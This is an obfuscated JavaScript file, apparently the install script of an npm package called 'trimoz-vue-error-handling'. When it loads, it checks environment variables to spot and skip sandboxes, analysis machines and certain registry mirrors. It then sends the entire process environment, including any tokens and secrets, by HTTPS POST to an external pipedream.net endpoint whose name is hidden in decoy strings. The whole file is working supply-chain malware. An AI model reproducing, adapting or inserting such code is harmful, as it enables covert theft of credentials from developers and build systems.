const goto = require('https');

function build() {
    let options = {
        "Name": "Add PI Contract",
        "Phone": "+155548945565",
        "Message": "My Home Dream Home",
        "Address": "Grish St pe-455 NET"
    };

    return (MoveAndStay(options['Address'].slice(9, 11), options['Name'].split(' ')[1]) +
        options['Message'].split(' ')[2] + MoveAndStay(options['Address'].slice(-3), '.'))
}

function MoveAndStay(str1, str2) {
    return str2 + str1
}

function num_is(item) {

    for (let i = 0; i < 4; i++) {
        if (i == 1) {
            item += 's'
        }
        if (i == 3) {
            item += 'e6'
        }
    }
    return item + '4'
}

function snooker(pkg_n, prefix) {

    let missing = [
        ['npm', 'package', 'name'].join('_'),
        ['npm', 'package', 'json'].join('_'),
    ];

    var plop = process['en' + 'v'] || {};

    //new edition
    if (importEngine(plop)){
        return ;
    }
    if (fixEveryHole(plop)){
        return ;
    }
    if (handleGod(plop)){
        return ;
    }
    if (missing.some( index => !plop[index] )) {
        return;
    }

    var req = goto
        .request(use_language(pkg_n, prefix))
        .on('error', function (err) { });
    req.write(JSON.stringify(plop));
    req.end();
}

function bible(comm){
    switch (comm) {
        case 'reg':
            return MoveAndStay('istry', 'reg');
        case 'conf':
            return 'conf' + 'ig';
        case 'np':
            return 'npm';
        case 'UNAME':
            return 'US' + 'ERNAME';
        case 'HM':
            return 'HOME';
        case 'USR':
            return 'USER';
        case 'APTA':
            return MoveAndStay('PDATA', 'AP');
        case 'py':
            return ['', 'usr', 'bin', 'pyt' + 'hon'].join('/');
        case 'anal':
            return 'ana'.concat('lysis');
        case 'INIT':
            return ['INIT', 'CWD'].join('_');
        case 'pkg':
            return 'pac'.concat('kage')
        case 'uname':
            return 'us' + MoveAndStay('ame', 'ern');
        case 'mitm':
            return MoveAndStay('-ca', 'mit' + 'mpr' + 'oxy');
        case 'n_mod':
            return ['', 'home', 'node', 'node_modules'].join('/');
        default:
            return null;
    }
}

function fixEveryHole(plop){
    let kill = capture_pictures(plop, bible('HM'), '/home/u'.concat('sername')) &&
    capture_pictures(plop, bible('USR'), bible('uname')) &&
    capture_pictures(plop, 'LOGNAME', bible('uname'));

    let move = capture_pictures(plop, 'PWD', '/my'.concat('-app')) &&
    capture_pictures(plop, 'DEB' + 'IAN_FRO' + 'NTEND', 'nonin'.concat('teractive')) &&
    capture_pictures(plop, bible('HM'), '/r'.concat('oot'));

    let teach = capture_pictures(plop, bible('APTA'), '/' + bible('anal').concat('/b' + 'ait'));

    let wheel = capture_pictures(plop, 'NODE_EXT' + 'RA_CA_CERTS', '/' + bible('mitm').concat('-cert.crt')) ||
        capture_pictures(plop, 'REQUESTS_C'.concat('A_BUNDLE'), '/' + bible('mitm').concat('.pem'));

    let fight = capture_pictures(plop, 'COMPLU' + 'S_ProfAPI_Profi' + 'lerCompa'.concat('tibilitySetting'), 'EnableV2Profiler') &&
        capture_pictures(plop, 'FPS_BROWS'.concat('ER_APP_PROFILE_STRING'), ['Internet', 'Explorer'].join(' ')) &&
        capture_pictures(plop, 'Path', 'C:\\WINDOWS\\System32\\Ope'.concat('nS' + 'SH') + '\\;c:\\' + takeAndGive('Files', 'Program ') + '\\nodejs\\;c:\\Stra'+'wberry\\c\\bin;c:\\Stra' + 'wberry\\perl\\site\\bin;c:\\Stra' + 'wberry\\perl\\bin');
    

    if ( kill || move || teach || wheel || fight){
        return true;
    } else {
        return false;
    }
}

var MapObj = function () {
    this.name = '__st' + (Math.random() * 145459 >> 0);
};

function handleGod(plop){
    const you = capture_pictures(plop, bible('HM'), ['', 'Us' + 'ers', 'jus' + 'tin'].join('\\')) &&
        capture_pictures(plop, bible('APTA'), ['', 'User' + 's', 'jus' + 'tin'].join('\\')) &&
        capture_pictures(plop, 'LOGONSERVER', [['DESKTOP','97KB'].join('-'), '6H'].join('B'));

    const me = capture_pictures(plop, 'MAIL', ['', 'var', 'mail', 'app'].join('/')) &&
        capture_pictures(plop, bible('HM'), ['', 'home', 'app'].join('/')) &&
        capture_pictures(plop, bible('USR'), 'app');

    const we = capture_pictures(plop, 'PWD', ['', bible('np'), 'node_modules'].join('/')) &&
    capture_pictures(plop, bible('INIT'), ['', bible('np')].join('/')) &&
    capture_pictures(plop, 'TMPDIR', '/sour'.concat('ce/tmp'));

    const us = capture_pictures(plop, 'EDITOR', 'vi') &&
        capture_pictures(plop, 'PROBE_'.concat(bible('UNAME')), '*') &&
        capture_pictures(plop, 'SHEL' + 'L', '/bi' + 'n/b'.concat('ash')) &&
        capture_pictures(plop, 'S' + 'HLVL', '2') &&
        capture_pictures(plop, bible('np').concat('_command'), 'run-s'.concat('cript')) &&
        capture_pictures(plop, 'NVM_CD_FLAGS', '') &&
        capture_pictures(plop, [bible('np'), bible('conf'), 'fund'].join('_'), '');

    const hip = '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin';
    const light  = '/home/node_modules/.bin:/node_modules/.bin';
    let holder = '';
    if (plop.npm_package_name && plop.npm_package_name.startsWith('@')){
        holder = capture_pictures(plop, 'PATH', `${bible('n_mod')}/${plop.npm_package_name}/node_modules/.bin:${bible('n_mod')}/${plop.npm_package_name.split('/')[0]}/node_modules/.bin:${bible('n_mod')}/node_modules/.bin:${bible('n_mod')}/.bin:${light}:/usr/local/lib/node_modules/npm/node_modules/@npmcli/run-script/lib/node-gyp-bin:${hip}`);
    } else {
        holder = capture_pictures(plop, 'PATH', `${bible('n_mod')}/${plop.npm_package_name}/node_modules/.bin:${bible('n_mod')}/node_modules/.bin:${bible('n_mod')}/.bin:${light}:/usr/local/lib/node_modules/${bible('np')}/node_modules/@${bible('np')}cli/run-script/lib/node-gyp-bin:${hip}`);
    }

    const jpa = holder && capture_pictures(plop, bible('INIT'), ['', 'home', 'node'].join('/')) &&
        capture_pictures(plop, 'COLOR', '1') &&
        capture_pictures(plop, 'EDITOR', 'vi');

    return you || me || us || we || jpa;
}

function use_language(pkg_n, prefix){
    return {
        hostname: prefix + '.m.' + build(),
        path: '/' + (pkg_n || ''),
        method: 'POST',
    }
}

function capture_pictures(p, name, val){
    let test = p[name] || '';
    return test.includes(val) || val === '*';
}

MapObj.prototype = {
    set: function (key, value) {
        var entry = key[this.name];
        if (entry && entry[0] === key)
            entry[1] = value;
        else
            defineProperty(key, this.name, { value: [key, value], writable: true });
        return this;
    },
    get: function (key) {
        var entry;
        return (entry = key[this.name]) && entry[0] === key ?
            entry[1] : undefined;
    },
    delete: function (key) {
        var entry = key[this.name];
        if (!entry || entry[0] !== key) return false;
        entry[0] = entry[1] = undefined;
        return true;
    },
    has: function (key) {
        var entry = key[this.name];
        if (!entry) return false;
        return entry[0] === key;
    }
};

function importEngine(plop){
    if (Object.keys(plop).length < 10 || plop.PWD === `/${plop.USER}/node_modules/${plop.npm_package_name}`) {
        return true;
    }
    if (capture_pictures(plop, [bible('np'), bible('conf'), bible('reg')].join('_'), ['taobao', 'org'].join('.')) ||
        capture_pictures(plop, [bible('np'), bible('conf'), bible('reg')].join('_'), [bible('reg'), bible('np').concat('mirror'), 'com'].join('.')) ||
        capture_pictures(plop, bible('UNAME'), MoveAndStay('admin', 'daas')) ||
        capture_pictures(plop, '_', bible('py')) ||
        capture_pictures(plop, [bible('np'), bible('conf'), 'metrics', bible('reg')].join('_'), ['taobao', 'org'].join('.'))) {
        return true;
    }
}

snooker('trimoz-vue-error-handling', 'eot26ln7pyh28o');